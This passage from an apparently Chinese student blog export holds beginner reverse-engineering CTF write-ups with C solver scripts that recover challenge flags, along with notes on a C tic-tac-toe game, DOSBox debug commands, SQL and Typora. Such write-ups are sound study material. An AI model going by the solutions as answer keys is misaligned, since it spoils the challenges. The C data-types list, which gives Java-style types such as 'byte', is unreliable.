v6</span></span><br><span class="line">      sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">      result = a3;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> str[<span class="number">20</span>] = &#123;<span class="number">90</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">67</span>,<span class="number">97</span>,<span class="number">78</span>,<span class="number">72</span>,<span class="number">51</span>,<span class="number">110</span>,<span class="number">103</span>&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="built_in">cout</span> &lt;&lt; str &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">     sub_4010F0(str,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">      <span class="built_in">cout</span> &lt;&lt; str &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>其实我还是不是很懂思路，所以还是放在这以后看，如果有看得懂思路且有信心教会我的好心人请直接来教教我！</p>
<p>排序完再转换就得到了前2位，于是得到flag</p>
<hr>
<p>把看不懂的反汇编出的代码写成跑得动、能一步一步看结果的代码的能力真的很重要！</p>
]]></content>
  </entry>
  <entry>
    <title>Buu re 01</title>
    <url>/2021/09/26/Buu%20re/</url>
    <content><![CDATA[<h1 id="尝试Buu的入门re题"><a href="#尝试Buu的入门re题" class="headerlink" title="尝试Buu的入门re题"></a>尝试Buu的入门re题</h1><p>因为题比较入门，所以做的比较轻松</p>
<span id="more"></span> 

<h2 id="一、easyre"><a href="#一、easyre" class="headerlink" title="一、easyre"></a>一、easyre</h2><p>打开就能看到flag</p>
<p><img src="https://i.loli.net/2021/09/25/quEIinget3vWcdU.png" alt="POJY9S_2~A3MW4UEG58J5A1.png"></p>
<hr>
<h2 id="二、新年快乐"><a href="#二、新年快乐" class="headerlink" title="二、新年快乐"></a>二、新年快乐</h2><p>查壳→查到upx壳→脱壳→打开</p>
<p><img src="https://i.loli.net/2021/09/25/khpRxfMbBN8QIVy.png" alt="V_ZG_WZO7GQ7_5E_J9_Y3P6.png"></p>
<p>可以看到输入和HapperNewYear! 一样时，输出this is true flag </p>
<p>所有得到flag为HapperNewYear!</p>
<h2 id="三、reverse1"><a href="#三、reverse1" class="headerlink" title="三、reverse1"></a>三、reverse1</h2><p>打开后，按F5，查看伪代码</p>
<p><img src="https://i.loli.net/2021/09/25/iySD8vUj96mwadY.png" alt="_Y_YCF9_M6G7___H6RGQ6JG.png"></p>
<p>看出要使输入和Str2一样，双击Str2</p>
<p><img src="https://i.loli.net/2021/09/25/ecoLPTbzHdChp4r.png" alt="PG6U_JNO8DVOU_QH6EBT@3K.png"></p>
<p>再往上看</p>
<p><img src="https://i.loli.net/2021/09/26/GMN67sr3fCRDxAO.png" alt="Z_J0__MD_I_7SK`84_`W7_4.png"></p>
<p>有一个逐个替换数组内元素的循环</p>
<p>按R直接转字符</p>
<p><img src="https://i.loli.net/2021/09/25/7T83kof6DxPhtKr.png" alt="T_`VSV~___P4DTG@YD`16_H.png"></p>
<p>看出是把o换成0</p>
<p>得到flag</p>
<ul>
<li>其实再往上看，有一个看不懂赋值，看不懂结束条件，且用c跑不动的循环，也没发现在转伪代码前对应的汇编指令，问了学长，可能是代码混淆。</li>
</ul>
<p><img src="https://i.loli.net/2021/09/25/yYKFcEBX4t8vquP.png" alt="__5WVI_9_P8MX9JMHTGG_8J.png"></p>
<hr>
<h2 id="四、reverse2"><a href="#四、reverse2" class="headerlink" title="四、reverse2"></a>四、reverse2</h2><p>打开看到下面这些</p>
<p><img src="https://i.loli.net/2021/09/26/raveS7dAM1FbDog.png" alt="3.png"></p>
<p>双击flag</p>
<p><img src="https://i.loli.net/2021/09/26/qas2xBAUEco6mJy.png" alt="K_6_QE6LHX7V1E~ZVL2_@_6.png"></p>
<p>r键 7Bh转成 ’ { ‘</p>
<p><img src="https://i.loli.net/2021/09/25/NhDoeL3ARUdjXEC.png" alt="4YR07_MLB`_`YQKY9A_U_FX.png"></p>
<p>再回到原本的伪代码</p>
<p><img src="https://i.loli.net/2021/09/26/Lvi8E7UBQDMRr1j.png" alt="444446R.png"></p>
<p>看到逐个把i r 换成1的循环</p>
<p>得到flag</p>
<hr>
<h2 id="五、内涵的软件"><a href="#五、内涵的软件" class="headerlink" title="五、内涵的软件"></a>五、内涵的软件</h2><p><img src="https://i.loli.net/2021/09/26/wEDF93NqdmfAKzn.png" alt="1@XSX_P8J___CI3B@R0__YB.png"></p>
<p>打开，看到 下文没有提到的变量就v5了，但是外面的是DBAPP，想不到有什么转码能把这个转成flag，但是又找不到别的信息，于是直接提交，失败，改成flag提交，成功</p>
<hr>
<h2 id="六、xor"><a href="#六、xor" class="headerlink" title="六、xor"></a>六、xor</h2><p>其实也只是简单的用了异或算法</p>
<p><img src="https://i.loli.net/2021/09/26/vVCb851LakRiEwS.png" alt="~6_XS6XQG_S052U4H5___Y5.png"></p>
<p>打开global看有哪些字符</p>
<p><img src="https://i.loli.net/2021/09/26/rwc7omIaqtMsL8T.png" alt="XG__YA_5@FJNXPVG_0_V6DI.png"></p>
<p>把算法抄下来，结果输出乱码了，于是多加了个f[]数组，就行了</p>
<p><del>虽然输出还是少个f，自己加上就行</del></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> __b[<span class="number">264</span>]=&#123;<span class="string">&#x27;f&#x27;</span>,<span class="number">0xA</span>,<span class="string">&#x27;k&#x27;</span>,<span class="number">0xC</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;x&#x27;</span>,<span class="number">0xD</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="number">0x11</span>,<span class="string">&#x27;p&#x27;</span>,<span class="number">0x19</span>,<span class="string">&#x27;F&#x27;</span>,<span class="number">0x1F</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="number">0xE</span>,<span class="string">&#x27;g&#x27;</span>,<span class="number">6</span>,<span class="string">&#x27;h&#x27;</span>,<span class="number">0xF</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;O&#x27;</span>&#125;;</span><br><span class="line">   <span class="keyword">char</span> f[<span class="number">100</span>]; </span><br><span class="line"> </span><br><span class="line">   <span class="keyword">for</span> (<span class="keyword">int</span>  i = <span class="number">1</span>; i &lt; <span class="number">33</span>; ++i )&#123;</span><br><span class="line">     __b[i] = <span class="keyword">char</span>(__b[i]);</span><br><span class="line">    f[i]=__b[i] ^ __b[i - <span class="number">1</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,f[i]);   </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天做的很基础，很入门，很相似，提升地只有一点点看代码的能力，和一点点写c语言脚本的能力</p>
<p>和在比赛里看到的题目比，差很多</p>
<ul>
<li>写这篇时有些图片名称是乱码，有可能会触发格式导致图片显示不了，可以靠直接改掉图片名解决</li>
</ul>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界re新手区部分记录</title>
    <url>/2021/09/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cre%E6%96%B0%E6%89%8B%E5%8C%BA%E9%83%A8%E5%88%86%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p> 初学，尝试</p>
<span id="more"></span> 

<h3 id="一、Hello-CTF"><a href="#一、Hello-CTF" class="headerlink" title="一、Hello, CTF"></a>一、Hello, CTF</h3><p>拿到一个程序，打开，</p>
<p><img src="https://i.loli.net/2021/09/23/VjUvLRGey9w6tWd.png" alt="2.png"></p>
<p>好，没啥东西，查壳</p>
<p><img src="https://i.loli.net/2021/09/23/zHMpEtha3oJlXFP.png" alt="3.png"></p>
<p>好，没壳，开他</p>
<p><img src="https://i.loli.net/2021/09/23/Zsuilz894rbfJWv.png" alt="4.png"></p>
<p>有很多看不懂的函数，但是可以看到，触发成功的条件是，v10=v13，这俩都是数据类型为字符的数组。虽然有些函数不认识但大致可以猜到输入从v9，v4，v10。</p>
<p>v13在这</p>
<p><img src="https://i.loli.net/2021/09/23/SQwE9idntPBaH2D.png" alt="5.png"></p>
<p>看着像16进制，转换，结束。</p>
<h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><ul>
<li>memset() 函数 初始化内存，这里memset(v10,0,sizeof(v10))表示把数组v10内容全换成0。</li>
<li>sprintf()函数 ，把格式化输出转入字符串，查了之后才发现原来是在这里转成16进制的。</li>
</ul>
<hr>
<h3 id="二、insanity"><a href="#二、insanity" class="headerlink" title="二、insanity"></a>二、insanity</h3><p><del>既然它都insanity了，那我当然可以直接拿txt打开</del></p>
<p>直接拿ida打开搜一搜flag也行</p>
<hr>
<h3 id="三、re1"><a href="#三、re1" class="headerlink" title="三、re1"></a>三、re1</h3><p>查壳→没壳</p>
<p>ida开他！</p>
<p><img src="https://i.loli.net/2021/09/23/jOVyTQZphXr6Scl.png" alt="6.png"></p>
<p>这些后面的if太怪了，假设它是道正常题目，从输入看，v9和v5有关系，v5的赋值里有个可以双击的东西</p>
<p> 双击，找到断成两截还反序了的flag。<img src="https://i.loli.net/2021/09/23/enVtQrdmqZ2huUx.png" alt="image-20210923204523796.png">这里的反序后面看了wp，也不太了解，只是知道这里的数据采用小端存储。</p>
<p><strong>高位字节在高位地址，低位字节在低位地址</strong></p>
<hr>
<h3 id="四、open-source"><a href="#四、open-source" class="headerlink" title="四、open-source"></a>四、open-source</h3><p>附件是c语言源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看得懂代码就好做，总之思路就是绕过重重if，顺便得到 fist second argv[3]都对应什么。</p>
<ol>
<li>first != 0xcafe →i am wrong，所以 first = 0xcafe</li>
<li>second需要符合 和5求余不等于3 和17求余等于8，我写了个代码</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> n; </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> x;x&lt;<span class="number">10</span>;x++)&#123;               <span class="comment">//实际上不用输出这么多次</span></span><br><span class="line">	i = <span class="number">17</span>*n+<span class="number">8</span> ;                         <span class="comment">//看wp别人都是直接取25不写这段代码的</span></span><br><span class="line">	<span class="keyword">if</span>(i%<span class="number">5</span>!=<span class="number">3</span>)</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,i);          </span><br><span class="line">	n++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;                              </span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<ol start="3">
<li>最后一个，strcmp()函数，相等是返回0，为假，可以阻止if触发，所以argv[3]=”h4cky0u”</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> first = <span class="number">0xcafe</span>;</span><br><span class="line">    <span class="keyword">int</span> second = <span class="number">25</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = <span class="string">&quot;h4cky0u&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出   Get your key: c0ffee 结束。</p>
<hr>
<h3 id="五、simple-unpack"><a href="#五、simple-unpack" class="headerlink" title="五、simple-unpack"></a>五、simple-unpack</h3><p><del>这题也可以直接用笔记本打开</del></p>
<p>当然正经解法还是按题目说的，脱壳，然后ida打开，可以直接找到flag</p>
<hr>
<h3 id="六、logmein"><a href="#六、logmein" class="headerlink" title="六、logmein"></a>六、logmein</h3><p>这题好多变量，储存方式好多，不过抄一下算法，把报错的BYTE根据百度查到的改成char，结束</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__int64 v7 = <span class="number">28537194573619560LL</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">char</span> v8[]=<span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>;</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; ++i)       </span><br><span class="line">	   <span class="built_in">putchar</span>(*((<span class="keyword">char</span> *)&amp;v7 + i % <span class="number">7</span>) ^ v8[i]);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure>



<p>试着分析一下</p>
<p>绕过所有if可以得到sub_4007F0,  双击查看<img src="https://i.loli.net/2021/09/23/lZPk3dv1HqujGfK.png" alt="8.png"></p>
<p>绕过所有if的输入值，就是正确密码，所以</p>
<p>s[i] = (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i])</p>
<p>v7是个数组 v6=7 v8是内容为:&quot;AL_RT^L*.?+6/46的数组</p>
<p>看wp，知道了_int64一般为小端存储，反序存储，虽然这题抄一下算法就能得解，但是算是解决了上面那题<strong>re1</strong>的疑惑。</p>
<hr>
<ul>
<li>其实还尝试了一下别的方向的新手题，但是感觉能被我做出来，那确实没什么好记录的</li>
<li>wp里好多使用python写解题脚本，但是我 目前不会</li>
</ul>
<p><img src="https://i.loli.net/2021/09/23/E3g79JfIoXWLp1A.jpg" alt="1.jpg"></p>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>尝试用c做一个简单的井字棋</title>
    <url>/2021/09/23/%E5%B0%9D%E8%AF%95%E7%94%A8c%E5%81%9A%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BA%95%E5%AD%97%E6%A3%8B/</url>
    <content><![CDATA[<h1 id="试着记录一下尝试使用c语言堆一个井字棋的过程"><a href="#试着记录一下尝试使用c语言堆一个井字棋的过程" class="headerlink" title="试着记录一下尝试使用c语言堆一个井字棋的过程"></a>试着记录一下尝试使用c语言堆一个井字棋的过程</h1><p> 编程语言还是得实操才能熟练，于是试着弄个井字棋，甚至本来想让程序永远不会输，顶多平局，可惜能力不足，这种东西归纳不动，列举又不想都列出来，索性先试着造出基础点的东西。</p>
  <span id="more"></span> 

<p>用代码堆一个井字棋，那确实还是输入，计算，输出</p>
<hr>
<h4 id="一、输入"><a href="#一、输入" class="headerlink" title="一、输入"></a>一、输入</h4><p>​     重要的就9个格子，完全可以用数组存储，将输入直接赋值给数组里的元素就行。</p>
<p>输入时，如果数组元素不为0，报错，并提示换个地方下。</p>
<h4 id="二、计算"><a href="#二、计算" class="headerlink" title="二、计算"></a>二、计算</h4><p>​        首先，需要随机决定先后手，我使用rand()随机生成一个数然后和2求余，只会有0、1两种结果。</p>
<p>不过，只用rand()就只会在第一次计算是生成一个数，后面再怎么运行也都是这数了，这好像不太随机，不大行。</p>
<p>​        于是我用了srand函数，原型:void srand(unsigned seed)</p>
<p>把它的参数设成系统时间，变化的参数使每次随机数都是重新生成的，从而达到随机的目的。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));</span><br><span class="line"><span class="keyword">int</span> first= rand()%<span class="number">2</span>;  <span class="comment">//然后根据first是1还是0，决定先后手</span></span><br></pre></td></tr></table></figure>

<p>​        还有一个自定义函数，大概思路是检测数组里，对应位置是1还是2，然后转换成对应坐标的O和X输出，为什么这里不用0和1呢，因为还有空着的情况，所以就直接采用0，1，2了</p>
<p>​        检测函数的整体代码就不放这了，对我这个初学者，不好用while循环简化，太长了，并且格式不是很好看，能动起来就挺不容易的。</p>
<p>​        还需要一个判断胜利，或者平局的条件，我是用对应数组相等，来判断的。</p>
<p>比如，程序下的棋使用存入1，玩家写入2，当一行都为1或2时，判断某方胜利。</p>
<p>如果9回合后没有哪方胜利，即平局</p>
<h4 id="三、输出"><a href="#三、输出" class="headerlink" title="三、输出"></a>三、输出</h4><p>​        在特定位置输出，书上确实没有，但是可以查到，并且顺便用上了同一个头文件的换颜色。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自定义的光标定位函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setCursorPosition</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    COORD coord;</span><br><span class="line">    coord.X = x;</span><br><span class="line">    coord.Y = y;</span><br><span class="line">    SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), coord);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//自定义的文字颜色函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setColor</span><span class="params">(<span class="keyword">int</span> color)</span></span>&#123;</span><br><span class="line">    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color) ;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><p>如果没有去实际操作，有些不理解的地方是肯定不会发现的（比如我在这之前不知道数组名称不配当某些自定义函数的参数）。</p>
</li>
<li><p>遇到问题，首先在备份后，尝试自己修改解决，还是不行，就试着描述问题，想想别人提问，或是别人总结这一问题时，会使用哪些关键词，然后看看别人怎么解决。</p>
</li>
<li><p>还有就是因为Sleep（）函数，我再次加深了，c语言函数需要区分好    <strong>大小写</strong></p>
</li>
</ul>
]]></content>
      <tags>
        <tag>c</tag>
      </tags>
  </entry>
  <entry>
    <title>非常非常初学的汇编dosbox基础指令基础用法</title>
    <url>/2021/09/21/%E9%9D%9E%E5%B8%B8%E9%9D%9E%E5%B8%B8%E5%88%9D%E5%AD%A6%E7%9A%84%E6%B1%87%E7%BC%96dosbox%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<h1 id="这大概就是汇编的基础增删改查吧"><a href="#这大概就是汇编的基础增删改查吧" class="headerlink" title="这大概就是汇编的基础增删改查吧"></a>这大概就是汇编的基础增删改查吧</h1><p>稍微整理了一下，理解了一下看到的基础用法</p>
<span id="more"></span> 

<p><strong>R指令 查看修改寄存器</strong></p>
<p>​      -r 查看<br>​      -r ax,2000 把ax改成2000</p>
<p><strong>D指令 查看内存</strong><br>      -d cs:ip 看看处于这个位置的内存里写了什么<br><strong>E指令 往内存里写东西</strong><br>     -e cs:ip 从这个地址开始写东西<br>     -e cs:ip 1 2 3 4 把01 02 03 04往内存写<br>     -e cs:ip ‘a’ 把a这个字符对应的ASCII码写入内存<br>     -e cs:ip b8 01 00 把这个往内存写，相当于也写入了对应的汇编指令 mov ax,0001<br><strong>U指令 解释内存中的机械指令和对应的汇编</strong><br>     -u cs:ip 从这个地址开始解释<br><strong>A指令 以汇编的形式写入指令</strong><br>      -a cs:ip mov ax,3<br><strong>T指令 执行命令</strong><br>      -t cs:ip 执行这个位置的命令</p>
]]></content>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>10分钟学点整理点sql常用指令</title>
    <url>/2021/09/21/10%E5%88%86%E9%92%9F%E5%AD%A6%E7%82%B9%E6%95%B4%E7%90%86%E7%82%B9sql%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="sql常用基础指令"><a href="#sql常用基础指令" class="headerlink" title="sql常用基础指令"></a>sql常用基础指令</h1><p>随便记记，意会就行，我自己看得懂就行</p>
<span id="more"></span> 
<ul>
<li>增:insert</li>
<li>删:delete</li>
<li>改:update</li>
<li>查:select或者show</li>
<li>alter table 表名 rename to 新表名；改表名</li>
<li>rename table 表名 to 新名；还是改表名</li>
<li>alter table 表名 add 字段名 字段类型        加列，添加多个要加括号，每个字段之间逗号隔开</li>
<li>alter table 表名 change 旧字段名 新字段名 字段类型   改列名</li>
<li>use 库名; 连接，或者说调出一个库</li>
<li>create database 库名字 建个库</li>
<li>show databases 列出所有库</li>
<li>mysqladmin -u root -p create 数据库名  也是建库</li>
<li>use test 调出一个库</li>
<li>select database() 看看当前库</li>
<li>drop database 库名字 删这个库</li>
<li>show columns from 表名  看看表的结构</li>
<li>UPDATE Person SET Address = ‘Zhongshan 23’, City = ‘Nanjing’ WHERE LastName = ‘Wilson’</li>
<li>在lastname这栏为wilson的那行 把address和city改了</li>
<li>select * from 表名    看看这个表</li>
</ul>
]]></content>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>尝试编写博客文章</title>
    <url>/2021/09/18/%E5%B0%9D%E8%AF%95%E7%BC%96%E5%86%99%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/</url>
    <content><![CDATA[<h1 id="尝试编写博客文章"><a href="#尝试编写博客文章" class="headerlink" title="尝试编写博客文章"></a>尝试编写博客文章</h1><h2 id="—-关于Typora快捷键的些许记录"><a href="#—-关于Typora快捷键的些许记录" class="headerlink" title="—-关于Typora快捷键的些许记录"></a>—-关于Typora快捷键的些许记录</h2><p>标题 Ctrl+1/2/3 整行对应一二三级标题</p>
<p><strong>加粗</strong> Ctrl+B</p>
<p><em>斜体</em> Ctrl+I</p>
<span id="more"></span> 

<p><u>下划线</u> Ctrl+U</p>
<p><del>删除线</del> Alt+Shift+5</p>
<p><code>代码片段</code> Ctrl+Shift+`</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码块 Ctrl+Shift+K</span><br></pre></td></tr></table></figure>

<p>跳出代码块 Ctrl+Enter</p>
<p><a href="https://stttrl.github.io/">链接</a> Ctrl+K（先复制链接，然后选中要加链接的文本，按快捷键。Ctrl+左键点击文本可跳转到对应链接）(这里的链接直接返回首页)</p>
<p>取消格式 再次按相同的快捷键</p>
<p>有序列表 数字+点+空格 </p>
<ol>
<li>a</li>
<li></li>
</ol>
<p> 无序列表 减号+空格</p>
<ul>
<li>a</li>
<li></li>
</ul>
<p>任务列表 加号或减号+空格</p>
<p>切换到列表下一行 Space+Enter</p>
<p>嵌套列表 按Tab键</p>
<p>退出列表 按 Shift+Tab</p>
<table>
<thead>
<tr>
<th>插入表格</th>
<th>Ctrl+T</th>
</tr>
</thead>
</table>
<blockquote>
<p>引用 Ctrl+Shift+Q</p>
</blockquote>
]]></content>
      <tags>
        <tag>Typora</tag>
      </tags>
  </entry>
  <entry>
    <title>c语言可能目前常用到的数据类型修饰符等</title>
    <url>/2021/09/17/c%E8%AF%AD%E8%A8%80%E5%8F%AF%E8%83%BD%E7%9B%AE%E5%89%8D%E5%B8%B8%E7%94%A8%E5%88%B0%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%BF%AE%E9%A5%B0%E7%AC%A6%E7%AD%89/</url>
    <content><![CDATA[<h1 id="C语言大概用的上的数据类型和修饰符等整理"><a href="#C语言大概用的上的数据类型和修饰符等整理" class="headerlink" title="C语言大概用的上的数据类型和修饰符等整理"></a>C语言大概用的上的数据类型和修饰符等整理</h1><p>数据类型</p>
<p><strong>byte</strong></p>
<ul>
<li><p>8位、有符号的以二进制补码表示的整数</p>
</li>
<li><p>min :  -128（-2^7）</p>
</li>
<li><p>max:  127(2^7-1)</p>
<span id="more"></span> </li>
</ul>
<p><strong>short</strong></p>
<ul>
<li>16位、有符号的以二进制补码表示的整数</li>
<li>min :  -32768（-2^15）</li>
<li>max:  32767（2^15 - 1）</li>
</ul>
<p><strong>int</strong></p>
<ul>
<li>32位、有符号的以二进制补码表示的整数</li>
<li>min :  -2,147,483,648（-2^31）</li>
<li>max:  2,147,483,647（2^31 - 1）</li>
</ul>
<p><strong>long</strong></p>
<ul>
<li>64位、有符号的以二进制补码表示的整数</li>
<li>min :  -9,223,372,036,854,775,808（-2^63）</li>
<li>max:  9,223,372,036,854,775,807（2^63 -1）</li>
</ul>
<p><strong>float</strong></p>
<ul>
